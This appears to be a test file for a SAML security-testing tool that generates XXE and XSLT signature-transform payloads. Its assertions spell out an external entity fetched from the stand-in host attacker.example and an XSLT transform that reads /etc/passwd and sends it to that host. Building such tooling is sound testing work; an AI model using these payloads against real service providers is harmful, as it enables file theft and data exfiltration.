// @vitest-environment jsdom
import { readFileSync } from "fs";
import { dirname, join } from "path";
import { fileURLToPath } from "url";

import { describe, expect, it } from "vitest";

import { applyXsltPayload, buildXxePayload } from "./payloads";

import { parseXml } from "@/core/saml/xml";

const SIGNED = readFileSync(
  join(
    dirname(fileURLToPath(import.meta.url)),
    "../../../tests/signing/signed-by-us.xml",
  ),
  "utf8",
);

const CALLBACK = "http://attacker.example";

const documentOf = (xml: string): Document => {
  const parsed = parseXml(xml);
  if (parsed.kind !== "Ok") throw new Error("fixture did not parse");
  return parsed.document;
};

describe("refusing to build a payload without a target", () => {
  it.each([
    ["", "empty"],
    ["   ", "blank"],
    ["attacker.example", "no scheme"],
    ["ftp://attacker.example", "wrong scheme"],
    ['http://a"onerror=x', "quote that would break out of the entity"],
    ["http://a b", "whitespace"],
  ])("refuses %s (%s)", (callback) => {
    expect(buildXxePayload(SIGNED, callback).kind).toBe("Refused");
    expect(applyXsltPayload(documentOf(SIGNED), callback).kind).toBe("Refused");
  });

  it("names the reason rather than failing silently", () => {
    const outcome = buildXxePayload(SIGNED, "");
    if (outcome.kind !== "Refused") throw new Error("expected a refusal");

    expect(outcome.reason).toContain("callback URL");
  });
});

describe("the XXE payload", () => {
  it("declares a parameter entity pointing at the callback", () => {
    const outcome = buildXxePayload(SIGNED, CALLBACK);
    if (outcome.kind !== "Ok") throw new Error(outcome.reason);

    expect(outcome.xml).toContain(
      `<!ENTITY % remote SYSTEM "${CALLBACK}/xxe.dtd">`,
    );
    expect(outcome.xml).toContain("%remote;");
  });

  it("names the root element in the doctype so the document stays well-formed", () => {
    const outcome = buildXxePayload(SIGNED, CALLBACK);
    if (outcome.kind !== "Ok") throw new Error(outcome.reason);

    expect(outcome.xml.startsWith("<!DOCTYPE samlp:Response [")).toBe(true);
  });

  it("keeps the original message intact below the doctype", () => {
    const outcome = buildXxePayload(SIGNED, CALLBACK);
    if (outcome.kind !== "Ok") throw new Error(outcome.reason);

    expect(outcome.xml.endsWith(SIGNED)).toBe(true);
  });

  it("stays inert: this plugin's own parser refuses to read it back", () => {
    const outcome = buildXxePayload(SIGNED, CALLBACK);
    if (outcome.kind !== "Ok") throw new Error(outcome.reason);

    const parsed = parseXml(outcome.xml);

    expect(parsed.kind).toBe("DoctypeRejected");
  });

  it("says what the payload would do to a service provider", () => {
    const outcome = buildXxePayload(SIGNED, CALLBACK);
    if (outcome.kind !== "Ok") throw new Error(outcome.reason);

    expect(outcome.effect).toContain(CALLBACK);
    expect(outcome.effect).toContain("never resolves it");
  });

  it("does not stack a doctype on a message that already has a prolog", () => {
    const outcome = buildXxePayload(`<?xml version="1.0"?>${SIGNED}`, CALLBACK);
    if (outcome.kind !== "Ok") throw new Error(outcome.reason);

    expect(outcome.xml.match(/<!DOCTYPE/g)).toHaveLength(1);
    expect(outcome.xml).not.toContain("<?xml");
  });
});

describe("the XSLT payload", () => {
  it("inserts a stylesheet transform ahead of the existing transforms", () => {
    const outcome = applyXsltPayload(documentOf(SIGNED), CALLBACK);
    if (outcome.kind !== "Ok") throw new Error(outcome.reason);

    expect(outcome.xml).toContain(
      'Algorithm="http://www.w3.org/TR/1999/REC-xslt-19991116"',
    );
    expect(outcome.xml).toContain("unparsed-text('/etc/passwd')");
    expect(outcome.xml).toContain(`document(concat('${CALLBACK}/?', $file))`);
  });

  it("produces a document that still parses, unlike the XXE payload", () => {
    const outcome = applyXsltPayload(documentOf(SIGNED), CALLBACK);
    if (outcome.kind !== "Ok") throw new Error(outcome.reason);

    expect(parseXml(outcome.xml).kind).toBe("Ok");
  });

  it("does not mutate the document it was given", () => {
    const document = documentOf(SIGNED);

    applyXsltPayload(document, CALLBACK);

    expect(document.getElementsByTagName("*").length).toBe(
      documentOf(SIGNED).getElementsByTagName("*").length,
    );
  });

  it("refuses a message with no signature transforms to attach to", () => {
    const outcome = applyXsltPayload(documentOf("<a/>"), CALLBACK);

    expect(outcome).toStrictEqual({
      kind: "Refused",
      reason:
        "this message has no signature transforms to insert a stylesheet into",
    });
  });
});
